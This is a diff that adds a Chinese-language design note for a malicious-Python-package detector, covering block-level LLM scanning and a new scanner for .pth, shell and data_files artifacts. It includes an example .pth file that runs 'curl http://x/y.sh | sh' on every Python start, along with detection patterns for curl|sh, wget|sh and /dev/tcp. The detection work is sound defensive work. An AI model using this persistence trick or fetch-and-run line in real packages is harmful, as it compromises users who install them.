@@ -1038,3 +1038,56 @@ MALICIOUS: base64→exec               → 编码载荷执行
 ## 未做(下一轮)
 跨工件(`pyproject.toml` / `.pth` / `.sh` / 数据文件)不在图上,需要
 Artifact 层;本轮只修"已建好的跨函数/跨文件边被划分丢掉"。
+--
+
+# 第十二轮:包块划分 + 跨工件补偿(2026-11)
+
+## A. 包块划分(Phase A 接线)
+投票路径只看"含危险节点的函数"——召回上限 = 标记器的召回率。
+现在机械投票落在 SUSPICIOUS/UNKNOWN 时,用**整包图**按 文件→函数→块
+切分,逐块读(粗筛只用于预算排序,不决定"哪里恶意"):
+
+- `_run_ddg_builder` 把整图快照留在 `self._full_graph`(含 function_name)
+- `_full_block_scan` 调 `analyze_package_graph`(block_nodes=400,
+  max_blocks=10),每块 LLM 自建链 + `verify_paths` 校验
+- 只有**验证链成立**才升级 MALICIOUS;单块预算 10,成本只落在歧义区
+- `_llm_escalation_corroborated` 接受 `block_scan` 的验证链作为结构性证据
+  (否则刚升级就被最终保险降回去)
+- `--no-block-scan` 关闭;结果 JSON 增加 `block_scan` 字段供审计
+
+与投票路径的本质区别:
+```
+投票:  只读"被标记的函数"        → 标记器没命中 = 永远看不到
+块扫:  每块都读(预算内)          → 漏检不再由标记器决定
+```
+
+## B. 跨工件缺口(Artifact Scanner)
+DDG 只解析 `.py`(`rglob('*.py')`),所以 `.pth` / `.sh` / `pyproject.toml`
+/ `data_files` 在图上**根本没有节点**。而 PyPI 最经典的持久化形态恰好在这:
+
+```python
+data_files=[("Lib/site-packages", ["data/evil.pth"])]
+# data/evil.pth:  import os; os.system("curl http://x/y.sh | sh")
+```
+`pip install` 后每次启动 Python 都执行——代码图里只有一个 `setup()` 调用,
+一条完整攻击链被切成两个互不相干的碎片。
+
+新增 `src/artifact_scanner.py`(图外旁路证据,不改图结构):
+1. 枚举非 .py 工件 → `render_for_prompt` 渲染成包级 prompt 的一段
+2. **确定性可判的形态直接产出 finding**(不依赖 LLM):
+   - `.pth` 执行行(`import` 开头,site.py 会执行)+ 危险能力词 → critical
+   - shell 里 curl|sh / wget|sh / /dev/tcp / -EncodedCommand → critical
+   - data_files 把 `.pth`/`.sh` 装进 site-packages → high
+3. 接入 `enhanced_detector`(汇总进 threats)+ `_package_level_analysis`
+   (signal 里加工件块)
+
+## 验证
+- `python tests/run_all.py`:16 个文件全绿
+  (新增 `test_artifact_scanner.py` 31 项)
+- 构造 `.pth` 持久化包:.pth 执行行被识别 → critical → 总体等级拉高
+- 干净包:0 findings,渲染为空串(不加噪声)
+
+## 仍未做
+真正的 Artifact 层(图上的 Artifact 节点 + contains/references 边),
+让"setup.py 的 data_files → evil.pth → import 行"成为**一条可验证的链**,
+而不只是旁路文本。这是下一阶段。
